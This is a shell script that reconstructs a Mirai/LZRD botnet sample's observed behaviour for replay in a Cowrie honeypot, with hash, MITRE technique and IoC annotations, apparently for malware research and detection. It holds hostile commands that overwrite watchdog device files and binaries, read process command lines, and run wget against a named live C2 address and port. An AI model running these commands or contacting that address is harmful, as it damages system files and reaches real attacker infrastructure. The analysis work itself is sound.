#!/bin/sh
# =============================================================================
# RECONSTRUCTED MALWARE BEHAVIOUR — NOT THE ORIGINAL BINARY
# =============================================================================
# Family:       Mirai / LZRD variant
# Architecture: MIPS big-endian (mips-msb)
# SHA256:       bf58bd0b459c515deb90524ec4cd3f9f2ee3e664d89962840f7a02cb8ad831ec
# Source:       MalwareBazaar
# Analysed via: tria.ge — debian-9-mipsbe — score 10/10 static / dynamic
# MITRE ATT&CK: T1562 (Impair Defenses), T1057 (Process Discovery)
# C2:           38.247.134.212:3778 TCP
# =============================================================================
# NOTE: Cowrie does not support shell loop syntax.
#       All loops from dynamic analysis are manually unrolled.
#       /dev/watchdog writes are simulated via cat/echo — Cowrie intercepts
#       file operations and records them without executing them.
#       The C2 beacon is simulated via wget since Cowrie captures HTTP
#       but cannot simulate raw TCP socket connections.
# =============================================================================

# PHASE 1 — DEFENCE EVASION (T1562: Impair Defenses)
# Observed: malware opens watchdog device files for write access
# Purpose:  prevent hardware watchdog from rebooting the infected device
# IoCs:     /dev/watchdog, /dev/misc/watchdog (confirmed in tria.ge file writes)
# Reference: https://attack.mitre.org/versions/v16/techniques/T1562/

echo '' > /dev/watchdog
echo '' > /dev/misc/watchdog
echo '' > /dev/watchdog0
echo '' > /sbin/watchdog
echo '' > /bin/watchdog

# PHASE 2 — DISCOVERY (T1057: Process Discovery)
# Observed: malware reads /proc/[pid]/cmdline for 29 unique PIDs
# Purpose:  enumerate running processes to identify security tools
#           or competing botnet instances to kill
# IoCs:     29 /proc/[pid]/cmdline reads confirmed in tria.ge signatures
# Loop unrolled: PIDs observed in sandbox at time of analysis

cat /proc/430/cmdline
cat /proc/656/cmdline
cat /proc/671/cmdline
cat /proc/673/cmdline
cat /proc/677/cmdline
cat /proc/678/cmdline
cat /proc/698/cmdline
cat /proc/699/cmdline
cat /proc/704/cmdline
cat /proc/706/cmdline
cat /proc/707/cmdline
cat /proc/709/cmdline
cat /proc/714/cmdline
cat /proc/726/cmdline
cat /proc/734/cmdline
cat /proc/742/cmdline
cat /proc/743/cmdline
cat /proc/754/cmdline
cat /proc/767/cmdline
cat /proc/771/cmdline
cat /proc/776/cmdline
cat /proc/777/cmdline
cat /proc/779/cmdline
cat /proc/791/cmdline
cat /proc/803/cmdline
cat /proc/815/cmdline
cat /proc/816/cmdline
cat /proc/819/cmdline
cat /proc/822/cmdline

# PHASE 3 — C2 BEACON
# Observed: TCP outbound to 38.247.134.212:3778
#           tx_bytes: 180, tx_packets: 3 — consistent with bot registration packet
# Note:     Cowrie cannot simulate raw TCP sockets.
#           wget approximates the outbound C2 connection for logging purposes.
#           The actual binary used a direct socket — not HTTP.
# Reference: Port 3778 associated with Mirai/LZRD C2 infrastructure
wget http://38.247.134.212:3778/
wget http://38.247.134.212:3778/
wget http://38.247.134.212:3778/
